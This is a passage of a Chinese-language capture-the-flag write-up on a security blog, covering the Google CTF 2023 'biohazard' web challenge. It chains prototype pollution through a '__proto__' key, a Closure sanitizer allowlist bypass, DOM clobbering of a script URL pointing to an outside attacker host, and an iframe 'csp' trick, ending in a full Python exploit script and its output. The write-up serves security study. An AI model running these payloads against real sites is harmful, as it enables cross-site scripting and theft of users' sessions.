+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">interestObj = &#123;<span class="string">&quot;favorites&quot;</span>:&#123;&#125;&#125;;</span><br><span class="line">  <span class="keyword">const</span> uuid = viewPath[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> json = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(json)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (interestObj[key] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">          interestObj[key] = json[key];</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="title class_">Object</span>.<span class="title function_">assign</span>(interestObj[key], json[key]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">alert</span>(xhr.<span class="property">response</span>);</span><br><span class="line">      location.<span class="property">href</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">`/bio/<span class="subst">$&#123;uuid&#125;</span>`</span>, <span class="literal">false</span>);</span><br><span class="line">  xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>在遍歷 JSON 物件時，會將每個屬性添加到 <strong>interestObj</strong> 中。如果 <strong>interestObj</strong> 已經有了相同的屬性，則使用 <strong>Object.assign()</strong> 方法將來自 JSON 物件的值合併到已有的物件中。這包括了 <strong><strong>proto</strong></strong> 屬性。</li>
+<li>由於 <strong><strong>proto</strong></strong> 是一個特殊的屬性，它是物件的原型。在這段程式碼中，當 <strong><strong>proto</strong></strong> 屬性存在於 JSON 物件中時，<strong>Object.assign()&#96;</strong> 方法將直接修改 <strong>interestObj</strong> 的原型，而不是在 <strong>interestObj</strong> 本身上添加屬性。</li>
+<li>這樣一來，<strong>interestObj</strong> 的原型就被成功地污染了，使得全局作用域中的變量可以被修改。這種原型污染漏洞可能導致安全風險，因為攻擊者可以利用它來修改全局作用域中的變量，進而影響應用程式的行為。</li>
+<li>使用者控制的資料：這裡的關鍵元素是 <code>xhr.response</code>。它有雙重目的：<ol>
+<li>對 <code>/bio/&lt;UUID&gt;</code> 的 GET 請求的回應正文，檢索使用者設定檔資訊。</li>
+<li>傳送至 <code>/bio/&lt;UUID&gt;/create</code> 的 POST 請求的回應正文，用於建立新設定檔。</li>
+</ol>
+</li>
+<li>攻擊向量：攻擊者可以透過向 <code>/create</code> 端點建構惡意 POST 請求來操縱 <code>xhr.response</code>。這涉及在設定檔資料 (json) 中包含 <code>&quot;proto&quot;: &#123;&quot;polluted&quot;: true&#125;</code></li>
+</ol>
+<p>在這種表單輸入的題目，使用者可以自行控制內容，可以通過向目標頁面發送POST請求，去創建內容</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">curl <span class="string">&#x27;https://biohazard-web.2023.ctfcompetition.com/create&#x27;</span> \</span><br><span class="line">  -X <span class="variable constant_">POST</span> \</span><br><span class="line">  -H <span class="string">&#x27;content-type: application/json&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;&#123;&quot;name&quot;:&quot;test&quot;,&quot;introduction&quot;:&quot;&quot;,&quot;favorites&quot;:&#123;&quot;hobbies&quot;:&quot;&quot;,&quot;sports&quot;:&quot;&quot;&#125;, &quot;__proto__&quot;: &#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//&#123;&quot;id&quot;:&quot;1025c907-69b7-4b3e-a756-c0413c4643d8&quot;&#125;   </span></span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/create&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">`&#123;&quot;name&quot;:&quot;test&quot;,&quot;introduction&quot;:&quot;&quot;,&quot;favorites&quot;:&#123;&quot;hobbies&quot;:&quot;&quot;,&quot;sports&quot;:&quot;&quot;&#125;, &quot;__proto__&quot;: &#123;&quot;polluted&quot;: true&#125;&#125;`</span></span><br><span class="line">&#125;);                                                                                                                                    </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Exploit Sequence<ul>
+<li><p>攻擊者控制的 <code>xhr.response</code> 被解析為 JavaScript 物件 ( <strong>json</strong>)。</p>
+</li>
+<li><p>程式碼使用 <code>Object.keys()</code> 迭代 json 中的<strong>KEY</strong>。這包括「name」、「introduction」、「favorites」和關鍵的「proto」</p>
+  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">interestObj[key] = json[key]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>由於 <code>interestObj</code>已經擁有自己的原型，遇到「<strong>proto</strong>」不會觸發<strong>if block</strong> （<code>interestObj[“proto”]</code>不會是未定義的）。</p>
+</li>
+<li><p>因此，<strong>else block</strong> 執行，使用 <code>Object.assign</code> 將 <code>json[&quot;proto&quot;]</code> 合併到 <code>interestObj[&quot;proto&quot;]</code> 中。</p>
+  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(interestObj[key], json[key])</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>關鍵在於 <code>json[&quot;proto&quot;]</code> 是攻擊者精心製作的數據，其中包含 {“polluted”: true} 屬性。</p>
+</li>
+<li><p>合併後， <code>interestObj[&quot;proto&quot;]</code>  成為攻擊者控制的具有污染屬性的原型物件。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>前面有提到，這題使用 <strong>Google Closure 保護網頁不受XSS危害</strong></p>
+<p>那如何bypass <strong>Google Closure?</strong></p>
+<p><a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=mychallenge.-,Closure,-ClosureSanitizerhas">Prototype pollution - and bypassing client-side HTML sanitizers - research.securitum.com</a> 在查看了這網站後得到了啟發</p>
+<p>Closure sanitizer 使用的是白名單，這檔案可以 <a target="_blank" rel="noopener" href="https://github.com/google/closure-library/blob/master/closure/goog/html/sanitizer/attributeallowlists.js">https://github.com/google/closure-library/blob/master/closure/goog/html/sanitizer/attributeallowlists.js</a> 在這查看到</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">AllowedAttributes</span> = &#123;</span><br><span class="line"><span class="comment">//&#x27;* ATTRIBUTE_NAME&#x27;: true,</span></span><br><span class="line">  <span class="string">&#x27;* ARIA-CHECKED&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* ARIA-COLCOUNT&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* ARIA-COLINDEX&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">&#x27;* VALUE&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* VSPACE&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;* WIDTH&#x27;</span>: <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">AllowedAttributes</span> = <span class="title class_">AllowedAttributes</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>AllowedAttributes</code> Object<ul>
+<li>該物件充當字典，其中鍵代表 HTML 標記名稱和屬性名稱的組合。</li>
+<li>每個key均遵循格式 <code>* TAG_NAME ATTRIBUTE_NAME</code></li>
+<li>星號 (*) 可能表示該規則適用於 <code>TAG_NAME</code> 的任何值</li>
+<li>與每個key關聯的值是一個布林值（true）</li>
+<li>指定 tag 允許使用相應的 attribute</li>
+</ul>
+</li>
+</ul>
+<p>通過添加到 create POST 請求中來注入新的標籤和屬性</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">AllowedAttributes</span>&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;TAG_NAME ATTRIBUTE_NAME&quot;</span>: <span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這樣就可以繞過 Closure sanitizer，但還需要繞CSP，但可能就會有人想，都繞過了 Closure sanitizer為何還要繞CSP</p>
+<ul>
+<li>Closure sanitizer的作用：<ul>
+<li>Closure sanitizer 充當白名單，在使用者控制的資料插入 HTML 之前過濾掉潛在危險的屬性。</li>
+<li>透過利用原型污染漏洞，您可以操縱消毒劑的白名單，允許未經授權的屬性通過。</li>
+</ul>
+</li>
+<li>CSP 的角色：<ul>
+<li>CSP 是一種由 Web 伺服器實現的安全性策略，用於限制應用程式載入腳本、樣式表、圖像和字體等資源的來源。</li>
+<li>它旨在透過防止執行未經授權的來源的惡意程式碼來緩解 XSS（跨站腳本）攻擊等漏洞。</li>
+</ul>
+</li>
+</ul>
+<p>為什麼兩者都是必要的：</p>
+<ul>
+<li>Sanitizer Bypass Doesn’t Guarantee Execution：<ul>
+<li>即使您繞過sanitizer並注入惡意屬性，也可能無法保證執行。</li>
+<li>如果該屬性指向來自未經授權的來源的惡意腳本，CSP 仍可能會阻止該屬性的執行。</li>
+</ul>
+</li>
+<li>CSP 實施限制：<ul>
+<li>CSP 充當獨立的安全層，限制應用程式可以取得和執行程式碼的位置。</li>
+<li>繞過清理程式僅允許未經授權的屬性，但 CSP 仍可能阻止它們載入惡意資源。</li>
+</ul>
+</li>
+<li>例子：<ul>
+<li>想像一下，您繞過 sanitizer 並注入指向惡意腳本的 onerror 屬性。</li>
+<li>但是，如果 CSP 將腳本載入限製到特定網域，則惡意腳本將不會執行，從而防止攻擊。</li>
+</ul>
+</li>
+<li>綜上所述：<ul>
+<li>繞過 Closure sanitizer 可以讓您更自由地製作潛在的惡意元素。</li>
+<li>要實現全面的攻擊，您通常還需要繞過 CSP。它充當單獨的防禦層，確保即使未經授權的屬性漏掉，由於來源限制，它們也不一定能夠執行惡意程式碼。</li>
+</ul>
+</li>
+</ul>
+<h3 id="CSP-bypass-by-restricting-CSP"><a href="#CSP-bypass-by-restricting-CSP" class="headerlink" title="CSP bypass by restricting CSP"></a><strong>CSP bypass by restricting CSP</strong></h3><p>先來查找XSS漏洞</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;trustedResourceUrl&#125; <span class="keyword">from</span> <span class="string">&#x27;safevalues&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;safeScriptEl&#125; <span class="keyword">from</span> <span class="string">&#x27;safevalues/dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>前面import了trustedResourceUrl</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/google/safevalues/tree/main/src#trustedresourceurl">safevalues&#x2F;src 在 main ·谷歌&#x2F;安全值 ·GitHub上</a></li>
+</ul>
+<p><img src="/img/GoogleCTFCSP_3.png" alt="Untitled"></p>
+<ul>
+<li>Script URLs 可能很危險，因為它們允許在目前網頁的來源（網域）內執行程式碼</li>
+<li>僅僅知道 URL 的來源是不夠的。惡意行為者可以利用某些網域上的開放重定向來重新導向到包含有害腳本的任意 URL</li>
+</ul>
+<p>通過查看 <code>!location.pathname.startsWith(&#39;/view/&#39;</code>) ，能發現他從bootstrap.js獲取變數</p>
+<p><img src="/img/GoogleCTFCSP_4.png" alt="Untitled"></p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">  ....</span><br><span class="line">  editor = (<span class="function"><span class="params">x</span>=&gt;</span>x)<span class="string">`/static/editor.js`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">(<span class="function">()=&gt;</span>&#123;<span class="keyword">var</span> e=<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="title class_">Field</span>(<span class="string">&quot;editMe&quot;</span>);e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">BasicTextFormatter</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">RemoveFormatting</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">UndoRedo</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">ListTabHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">SpacesTabHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">EnterHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">HeaderFormatter</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="title class_">LoremIpsum</span>(<span class="string">&quot;Click here to edit&quot;</span>)),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">LinkDialogPlugin</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">LinkBubble</span>);<span class="keyword">const</span> o=[goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">LINK</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">BOLD</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">ITALIC</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">UNORDERED_LIST</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_COLOR</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_FACE</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_SIZE</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_LEFT</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_CENTER</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_RIGHT</span>];<span class="keyword">var</span> g=goog.<span class="property">ui</span>.<span class="property">editor</span>.<span class="property">DefaultToolbar</span>.<span class="title function_">makeToolbar</span>(o,goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;toolbar&quot;</span>));<span class="keyword">new</span> goog.<span class="property">ui</span>.<span class="property">editor</span>.<span class="title class_">ToolbarController</span>(e,g),e.<span class="title function_">makeEditable</span>(),goog.<span class="property">events</span>.<span class="title function_">listen</span>(e,goog.<span class="property">editor</span>.<span class="property">Field</span>.<span class="property">EventType</span>.<span class="property">DELAYEDCHANGE</span>,(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">let</span> o=e.<span class="title function_">getCleanContents</span>(),g=goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;youtube&quot;</span>).<span class="property">value</span>;<span class="keyword">if</span>(g.<span class="title function_">startsWith</span>(<span class="string">&quot;https://www.youtube.com/watch&quot;</span>))&#123;<span class="keyword">let</span> e=<span class="keyword">new</span> <span class="title function_">URL</span>(g),t=<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(e.<span class="property">search</span>),i=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);i.<span class="property">src</span>=<span class="string">`https://www.youtube.com/embed/<span class="subst">$&#123;t.get(<span class="string">&quot;v&quot;</span>)&#125;</span>`</span>,i.<span class="property">width</span>=<span class="string">&quot;560&quot;</span>,i.<span class="property">height</span>=<span class="string">&quot;315&quot;</span>,o+=<span class="string">&quot;&lt;br&gt;&quot;</span>+i.<span class="property">outerHTML</span>&#125;<span class="keyword">let</span> t=sanitizer.<span class="title function_">sanitize</span>(o);<span class="title function_">setInnerHTML</span>(goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;preview&quot;</span>),t),goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;introduction&quot;</span>).<span class="property">value</span>=t&#125;))&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>簡單來說他的調用流程是</p>
+<p>main.js &gt; !location.pathname.startsWith(‘&#x2F;view&#x2F;’) &gt; bootstrap.js &gt; editor &#x3D; (x&#x3D;&gt;x) &#x2F;static&#x2F;editor.js; &gt; main.js &gt; safeScriptEl.setSrc(script, trustedResourceUrl(editor)) &gt; editor (bootstrap.js)</p>
+<p>如果攻擊者能夠控制 editor 變數，並將其設置為指向包含惡意 JavaScript 的 URL，那麼當該頁面被其他用戶訪問時，瀏覽器將會自動下載並執行這個指定的 JavaScript，從而觸發 XSS 漏洞，使得攻擊者能夠在受害者的瀏覽器上執行任意的 JavaScript ，從而達到竊取用戶信息、盜取會話令牌、導致用戶重定向到惡意網站等惡意目的</p>
+<p>查看 Closure sanitizer 配置，如果 iframe 內的頁面與父頁面same-origin，則可以使用 iframe 中的屬性來阻止 iframe 內的某些資源（使用 CSP）。因此，您可以阻止loading</p>
+<p>我們可以使用的一個巧妙技巧是 iframe 並使用 csp 屬性對嵌入文件強制實施內容安全策略（請注意，這又是一個僅在 Chrome 61+ 中存在的實驗性功能，但在 Firefox 或 Safari 中不存在），使用以下 iframe 來阻止在 iframe 中的文件中載入</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]&quot;</span> csp=<span class="string">&quot;script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>這個 JavaScript 文件將會被用於在 iframe 中執行，從而繞過了對主要頁面的 CSP (Content Security Policy) 限制。</p>
+<ol>
+<li><strong>利用原型污染漏洞控制變數</strong>：利用之前發現的原型污染漏洞，將變數（<strong>editor</strong>）設置為指向惡意的 JavaScript 文件的 URL。這樣做可以控制網頁加載的腳本，從而執行任意的 JavaScript 。</li>
+<li><strong>使用 iframe 嵌入</strong>：將包含惡意 JavaScript 的 iframe 嵌入到主要頁面中。這樣，即使主頁面上的 CSP 配置阻止直接載入該 JavaScript，但在 iframe 中載入的 JavaScript 仍然可以執行。這就是通過 iframe 的方式來繞過 CSP 的限制。</li>
+<li><strong>利用頁面路徑的特性</strong>：這個攻擊利用了頁面路徑的特性，特別是對 <strong>&#x2F;view&#x2F;</strong> 路徑的處理。在這個應用中，當 URL 的路徑以 <strong>&#x2F;view&#x2F;</strong> 開頭時，不會執行與頁面初始化相關的程式。但是，通過將路徑設置為 **&#x2F;test&#x2F;view&#x2F;[bio_uuid]**，在此之後的所有路徑信息都會被視為 UUID，並且相應的初始化程式將被執行。</li>
+</ol>
+<p>綜合這些步驟，可以成功地繞過主頁面的 CSP 限制，並在 iframe 中執行惡意的 JavaScript ，從而實現 XSS 攻擊。</p>
+<p>以下python腳本創建第一個 Bio 並覆蓋第一個 Bio，並使用特定的 CSP 對第一個 Bio 進行 iframe</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/env python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">URL</span> = <span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">first_response = requests.<span class="title function_">post</span>(f<span class="string">&quot;&#123;URL&#125;/create&quot;</span>, headers=headers, json=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;introduction&quot;</span>: <span class="string">&quot;&lt;a id=editor href=https://attack.shhnjk.com/alert.js&gt;&lt;/a&gt;&lt;a id=editor&gt;&lt;/a&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;favorites&quot;</span>: &#123;<span class="string">&quot;hobbies&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;sports&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;* ID&quot;</span>: <span class="title class_">True</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line">first_bio = first_response.<span class="title function_">json</span>()</span><br><span class="line"></span><br><span class="line">second_response = requests.<span class="title function_">post</span>(f<span class="string">&quot;&#123;URL&#125;/create&quot;</span>, headers=headers, json=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;introduction&quot;</span>: f<span class="string">&quot;&lt;iframe src=\&quot;&#123;URL&#125;/views/view/&#123;first_bio[&#x27;id&#x27;]&#125;\&quot; csp=\&quot;script-src https://attack.shhnjk.com/alert.js &#123;URL&#125;/static/closure-library/ &#123;URL&#125;/static/sanitizer.js &#123;URL&#125;/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;\&quot;&gt;&lt;/iframe&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;favorites&quot;</span>: &#123;<span class="string">&quot;hobbies&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;sports&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;IFRAME CSP&quot;</span>: <span class="title class_">True</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line">second_bio = second_response.<span class="title function_">json</span>()</span><br><span class="line"><span class="title function_">print</span>(f<span class="string">&quot;Report URL: &#123;URL&#125;/view/&#123;second_bio[&#x27;id&#x27;]&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python3 expjs.<span class="property">py</span> </span><br><span class="line"><span class="title class_">Report</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//biohazard-web.2023.ctfcompetition.com/view/9991bfe8-c422-4258-89d3-600b305c8a07</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>並開啟網頁查看，可以看到成功繞過了CSP嵌入了iframe語法</p>
+<p><img src="/img/GoogleCTFCSP_5.png" alt="Untitled"></p>
+
+  </div>
+  
+  <div class="article-tags">
+    
+  </div>
+
+  
+
+</article>
+
+      <script>document.getElementById("loading-bar").style.width="60%";</script>
+    </main>
+    
+<footer id="footer" class="clearfix">
+	
+  <div>&copy; <a href="https://no-flag.com">HackThe4O4</a> Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
+  <div>Powered by <a target="_blank" href="https://hexo.io/" rel="external noopener">Hexo</a>.</div>
+</footer>
+
+
+    <script>document.getElementById("loading-bar").style.width="80%";</script>
+    <div class="overlay"></div>
+  </div>
+  <div class="site-sidebar">
+
+	
+	
+	<div class="sidebar-switch clearfix "
+		style="display: none">
+		<a class="dark-btn active" data-toggle="toc">
+	    <span class="icon icon-list"></span>
+	    <span class="text">Index</span>
+	  </a>
+	  <a class="dark-btn" data-toggle="bio">
+	    <span class="icon icon-person"></span>
+	    <span class="text">Bio</span>
+	  </a>
+	</div>
+
+	<div class="site-toc "
+		style="display: none">
+		
+	    <div class="no-index">No Index</div>
+	  
+  </div>
+  
+	<div class="site-bio show"
+		style="display: block">
+		
+	  <!-- About Me -->
+	  <div class="about-me clearfix">
+	    <div class="avatar">
+	      <img src="/img/avatar.png" />
+	    </div>
+	    <div class="info">
+	      <a class="name dark-btn" href="/about">
+	        Noflag
+	      </a>
+	    </div>
+	    <div class="info">
+	      <span class="item desc">
+	        Documenting the journey of cyber security
+	      </span>
+	    </div>
+	  </div>
+	
+	  <!-- Social Icons -->
+	  <div class="social clearfix">
+	    
+	      
+	        <a href="/atom.xml" class="feed"
+	          target="_blank" rel="external">
+	          <span class="icon icon-feed"></span>
+	        </a>
+	      
+	        <a href="https://github.com/artchen" class="github"
+	          target="_blank" rel="external">
+	          <span class="icon icon-github"></span>
+	        </a>
+	      
+	    
+	  </div>
+
+	</div>
+
+	<div class="shortcuts">
+		<a href="#header" class="top window-nav dark-btn" id="go-top">
+			<span class="icon icon-chevron-thin-up"></span>
+		</a>
+		<a class="close dark-btn" id="sidebar-close">
+			<span class="icon icon-close"></span>
+		</a>
+		<a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+			<span class="icon icon-chevron-thin-down"></span>
+		</a>
+	</div>
+
+</div>
+
+  <!-- Universal Search -->
+
+<script type="text/javascript">
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "google";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>
+
+
+<script src="/js/search.js"></script>
+
+
+<script src="/js/app.js"></script>
+
+
+<!-- Disqus -->
+
+
+
+<!-- Valine -->
+
+
+<!-- Swiftype -->
+<!-- Please replace with your own swiftype settings -->
+<!--
+<script type="text/javascript">
+  /* Swiftype */
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
